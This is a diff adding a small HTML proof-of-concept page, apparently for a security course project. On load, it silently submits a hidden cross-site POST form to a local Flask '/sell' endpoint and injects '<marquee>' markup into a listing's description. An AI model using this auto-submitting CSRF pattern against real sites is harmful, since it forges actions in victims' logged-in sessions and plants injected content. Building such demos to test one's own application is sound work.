@@ -1,0 +1,16 @@
+<!doctype html>
+<html>
+  <body>
+    <h3>CSRF Auto-Submit</h3>
+    <!-- Posts cross-site to our Flask /sell -->
+     <!-- !!! Replace with server IP in CCSEP chat. Actual IP omitted for GitHub -->
+    <form action="http://localhost:5000/sell" method="POST" id="f">
+      <input type="hidden" name="make" value="CSRF">
+      <input type="hidden" name="model" value="Attack">
+      <input type="hidden" name="year" value="2099">
+      <input type="hidden" name="price" value="0">
+      <input type="hidden" name="description" value="<marquee>Added via CSRF</marquee>">
+    </form>
+    <script>setTimeout(()=>document.getElementById('f').submit(), 300);</script>
+  </body>
+</html>
